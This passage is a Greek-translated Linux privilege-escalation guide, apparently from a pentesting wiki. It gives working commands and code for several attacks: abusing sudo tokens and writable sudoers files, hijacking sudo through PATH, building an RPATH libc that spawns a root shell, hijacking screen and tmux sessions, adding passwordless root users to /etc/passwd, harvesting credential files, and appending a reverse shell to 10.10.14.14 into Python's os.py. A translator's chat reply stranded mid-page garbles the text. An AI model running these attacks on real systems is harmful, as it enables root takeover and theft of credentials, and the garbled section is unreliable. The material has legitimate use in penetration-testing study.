Απαιτήσεις για να αυξήσετε τα προνόμια:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" έχει **χρησιμοποιήσει `sudo`** για να εκτελέσει κάτι στα **τελευταία 15 λεπτά** (εξ ορισμού αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κάποιο password)
- `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- `gdb` είναι προσβάσιμο (μπορείτε να το ανεβάσετε)

(Μπορείτε προσωρινά να ενεργοποιήσετε το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας `/etc/sysctl.d/10-ptrace.conf` και ρυθμίζοντας `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι προϋποθέσεις, **μπορείτε να αυξήσετε τα προνόμια χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα αποκτήσετε αυτόματα root shell, κάντε `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που **κάνει τα sudo tokens μόνιμα και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **δικαιώματα εγγραφής** στο φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργούνται μέσα σε αυτόν, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε προνόμια sudo** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό, κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και πώς. Αυτά τα αρχεία **εξ ορισμού μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να καταφέρετε να **αποκτήσετε κάποια ενδιαφέρουσα πληροφορία**, και αν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα είστε σε θέση να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτή την άδεια.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές για το δυαδικό `sudo`, όπως το `doas` για το OpenBSD. Θυμηθείτε να ελέγξετε τη ρύθμισή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Εάν γνωρίζετε ότι ένας **user συνήθως συνδέεται σε ένα μηχάνημα και χρησιμοποιεί `sudo`** για να ανυψώσει προνόμια και έχετε ένα shell μέσα στο περιβάλλον αυτού του user, μπορείτε να **create a new sudo executable** που θα εκτελέσει τον κώδικά σας ως root και μετά την εντολή του user. Έπειτα, **modify the $PATH** του περιβάλλοντος του user (για παράδειγμα προσθέτοντας το νέο path σε .bash_profile) έτσι ώστε όταν ο user εκτελεί sudo, το sudo executable σας να εκτελείται.

Σημειώστε ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα ακόμα παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή τρέχοντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία διαμόρφωσης που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία διαμόρφωσης από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία διαμόρφωσης **δείχνουν σε άλλους φακέλους** όπου **βιβλιοθήκες** θα **αναζητηθούν**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Εάν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις δηλωμένες διαδρομές: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται μέσα στα αρχεία `/etc/ld.so.conf.d/*.conf`, ενδέχεται να μπορεί να αποκτήσει αυξημένα προνόμια.\
Δείτε **πώς να εκμεταλλευτείτε αυτή τη λανθασμένη ρύθμιση** στην παρακάτω σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αν αντιγράψετε τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως καθορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων root προνομίων σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **προνόμια σε μικρότερες και διακριτές μονάδες**. Καθεμία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο το πλήρες σύνολο προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα σχετικά με τις capabilities και πώς να τις καταχραστείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο επηρεαζόμενος χρήστης μπορεί να "**cd**" στον φάκελο.\
Το **"read"** bit υποδηλώνει ότι ο χρήστης μπορεί να **εμφανίσει** τα **αρχεία**, και το **"write"** bit υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο των διακριτικών δικαιωμάτων, ικανό να **παρακάμπτει τα παραδοσιακά ugo/rwx δικαιώματα**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο πρόσβασης σε αρχείο ή κατάλογο επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** τον χρήστη "kali" δικαιώματα read και write πάνω σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λάβετε** αρχεία με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές shell sessions

Σε **παλαιότερες εκδόσεις** μπορεί να **hijack** κάποια **shell** session ενός διαφορετικού χρήστη (**root**).\
Στις **νεότερες εκδόσεις** θα μπορείτε να **connect** σε screen sessions μόνο του **δικού σας user**. Ωστόσο, μπορεί να βρείτε **interesting information inside the session**.

### screen sessions hijacking

**Λίστα screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Συνδέσου σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με τις **old tmux versions**. Δεν μπόρεσα να hijack μια tmux (v2.1) session που δημιουργήθηκε από root ως non-privileged user.

**Λίστα tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Συνδεθείτε σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** για παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH κλειδιά που δημιουργήθηκαν σε συστήματα βάσει Debian (Ubuntu, Kubuntu, κ.λπ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 μπορεί να έχουν επηρεαστεί από αυτό το σφάλμα.  
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία νέου ssh κλειδιού σε αυτά τα OS, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το δημόσιο ssh κλειδί μπορείτε να αναζητήσετε το αντίστοιχο ιδιωτικό κλειδί**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές διαμόρφωσης

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η αυθεντικοποίηση με κωδικό. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η αυθεντικοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν η αυθεντικοποίηση με κωδικό επιτρέπεται, καθορίζει αν ο server επιτρέπει σύνδεση σε λογαριασμούς με κενό κωδικό. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο χρήστης root μπορεί να συνδεθεί μέσω ssh. Η προεπιλογή είναι `no`. Δυνατές τιμές:

- `yes`: ο root μπορεί να συνδεθεί χρησιμοποιώντας κωδικό και ιδιωτικό κλειδί
- `without-password` or `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί και μόνο αν έχουν οριστεί επιλογές εντολών
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα δημόσια κλειδιά που μπορούν να χρησιμοποιηθούν για την αυθεντικοποίηση χρηστών. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από τον κατάλογο χρήστη. **Μπορείτε να δηλώσετε απόλυτες διαδρομές** (αρχίζοντας από `/`) ή **σχετικές διαδρομές από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η διαμόρφωση θα υποδείξει ότι αν προσπαθήσετε να συνδεθείτε με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key του key σας με αυτά που βρίσκονται στο `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σας επιτρέπει να **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Έτσι, θα μπορείτε να **jump** via ssh **to a host** και από εκεί **jump to another** host **using** the **key** located in your **initial host**.

Πρέπει να ορίσετε αυτήν την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, αυτός ο host θα μπορεί να έχει πρόσβαση στα keys (που είναι πρόβλημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να αρνηθεί αυτήν τη διαμόρφωση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αρνηθεί** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (προεπιλογή: allow).

Αν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα καθώς **ενδέχεται να μπορείτε να το καταχραστείτε για να αποκτήσετε αυξημένα προνόμια**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ενδιαφέροντα Αρχεία

### Αρχεία προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από `/etc/profile.d/` είναι **scripts that are executed when a user runs a new shell**. Επομένως, εάν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κλιμακώσετε προνόμια**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Εάν βρεθεί κάποιο περίεργο profile script, θα πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Αρχεία passwd/shadow

Ανάλογα με το λειτουργικό σύστημα, τα `/etc/passwd` και `/etc/shadow` αρχεία μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως συνιστάται να **βρείτε όλα αυτά** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή ισοδύναμο αρχείο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Αρχικά, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Δεν μου έδωσες το περιεχόμενο του αρχείου src/linux-hardening/privilege-escalation/README.md. Στείλε το κείμενο που θέλεις να μεταφράσω και θα το επιστρέψω μεταφρασμένο στα Ελληνικά διατηρώντας ακριβώς την ίδια markdown/html σύνταξη και τα tags/paths/links όπως καθορίστηκε.

Επίσης, διευκρίνισε τι εννοείς με "Then add the user `hacker` and add the generated password.": θέλεις να προσθέσω στη μεταφρασμένη έκδοση μια γραμμή που δηλώνει τον χρήστη `hacker` και έναν τυχαία δημιουργημένο κωδικό; Θέλεις να δημιουργήσω πραγματικά τον χρήστη στο σύστημά σου (δεν έχω πρόσβαση για να το κάνω) ή απλώς να παράσχω τις εντολές/τον κωδικό να τρέξεις εσύ; Αν θέλεις κωδικό, πόσο μακρύ/πολύπλοκο να είναι (π.χ. 16 χαρακτήρες, περιλαμβάνει σύμβολα);
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείτε να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις ακόλουθες γραμμές για να προσθέσετε έναν dummy user χωρίς κωδικό.\
ΠΡΟΣΟΧΗ: μπορεί να υποβαθμίσει την τρέχουσα ασφάλεια της μηχανής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Σημείωση: Στις πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και στο `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάστηκε σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν το μηχάνημα τρέχει έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο ρύθμισης υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν backups ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανώς να μην μπορείτε να διαβάσετε τον τελευταίο φάκελο αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Περίεργη Τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία των τελευταίων λεπτών
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διάβασε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ο οποίος αναζητά **πολλά πιθανά αρχεία που μπορεί να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμη ενδιαφέρον εργαλείο** που μπορείς να χρησιμοποιήσεις για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για να ανακτήσει πολλούς κωδικούς πρόσβασης αποθηκευμένους σε τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείς να διαβάσεις logs, μπορεί να καταφέρεις να βρεις **ενδιαφέρουσες/απόρρητες πληροφορίες μέσα τους**. Όσο πιο περίεργο είναι το log, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, κάποια "**κακώς**" διαμορφωμένα (backdoored?) **audit logs** μπορεί να σου επιτρέψουν να **καταγράψεις κωδικούς πρόσβασης** μέσα σε audit logs όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πολύ χρήσιμη.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα στα logs, ή hashes regexps.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να δείτε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

Για να **backdoor the library** απλώς προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **write permissions** σε ένα αρχείο καταγραφής ή τους γονικούς καταλόγους του να αποκτήσουν πιθανώς αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγξετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται το log rotation.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει το `logrotate` έκδοση `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε όταν βρείτε ότι μπορείτε να αλλάξετε logs, ελέγξτε ποιος διαχειρίζεται αυτά τα logs και αν μπορείτε να αυξήσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης είναι σε θέση να **write** ένα script `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** να **adjust** ένα υπάρχον, τότε το σύστημά σας είναι **pwned**.

Τα network scripts, π.χ. _ifcg-eth0_, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, είναι \~sourced\~ στο Linux από το Network Manager (dispatcher.d).

Στην περίπτωσή μου, το `NAME=` που αποδίδεται σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν έχετε **λευκό/κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το λευκό/κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι βρίσκεται μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό διάστημα ανάμεσα στο Network και /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Άλλα Tricks

### NFS Privilege escalation


{{#ref}}
